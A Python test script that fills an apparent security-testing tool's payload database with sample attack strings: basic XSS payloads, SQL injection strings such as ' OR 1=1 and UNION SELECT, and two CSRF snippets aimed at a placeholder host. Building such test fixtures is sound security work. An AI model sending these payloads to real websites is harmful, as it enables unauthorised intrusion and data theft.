#!/usr/bin/env python3
"""
Test script to manually populate payload repository for testing
"""

import sys
from pathlib import Path

# Add database to path
db_path = Path(__file__).parent / "database"
sys.path.insert(0, str(db_path))

from payload_repository import PayloadRepositoryManager

# Sample payloads untuk testing
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror='alert(1)'>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT NULL --",
    "1' AND '1'='1",
    "' OR 1=1 --",
]

CSRF_PAYLOADS = [
    "<img src='http://vulnerable.com/update?action=delete'>",
    "<form method='POST' action='http://vulnerable.com/transfer'></form>",
]

def populate_payloads():
    """Populate repository with sample payloads."""
    repo = PayloadRepositoryManager("data/payload_repository.db")
    
    count = 0
    
    # Add XSS payloads
    for payload in XSS_PAYLOADS:
        try:
            payload_id = repo.add_payload(
                payload_text=payload,
                category="XSS",
                payload_type="JavaScript Injection",
                severity="High",
                source="test_script",
                description=f"Test XSS payload: {payload[:30]}..."
            )
            print(f"[✓] Added XSS payload: {payload[:40]}...")
            count += 1
        except Exception as e:
            print(f"[!] Failed to add XSS payload: {e}")
    
    # Add SQLi payloads
    for payload in SQLI_PAYLOADS:
        try:
            payload_id = repo.add_payload(
                payload_text=payload,
                category="SQL Injection",
                payload_type="SQL Injection",
                severity="Critical",
                source="test_script",
                description=f"Test SQLi payload: {payload[:30]}..."
            )
            print(f"[✓] Added SQLi payload: {payload[:40]}...")
            count += 1
        except Exception as e:
            print(f"[!] Failed to add SQLi payload: {e}")
    
    # Add CSRF payloads
    for payload in CSRF_PAYLOADS:
        try:
            payload_id = repo.add_payload(
                payload_text=payload,
                category="CSRF",
                payload_type="CSRF",
                severity="Medium",
                source="test_script",
                description=f"Test CSRF payload"
            )
            print(f"[✓] Added CSRF payload: {payload[:40]}...")
            count += 1
        except Exception as e:
            print(f"[!] Failed to add CSRF payload: {e}")
    
    # Verify
    print(f"\n[✓] Populated {count} payloads total")
    
    # Show stats
    stats = repo.get_stats()
    print(f"\n[✓] Repository Stats:")
    print(f"    Total payloads: {stats['total_payloads']}")
    print(f"    Vulnerable payloads: {stats['vulnerable_payloads']}")
    print(f"\nBy Category:")
    for cat, data in stats['by_category'].items():
        print(f"    {cat}: {data['count']} payloads (avg success rate: {data['avg_rate']:.1f}%)")

if __name__ == "__main__":
    populate_payloads()
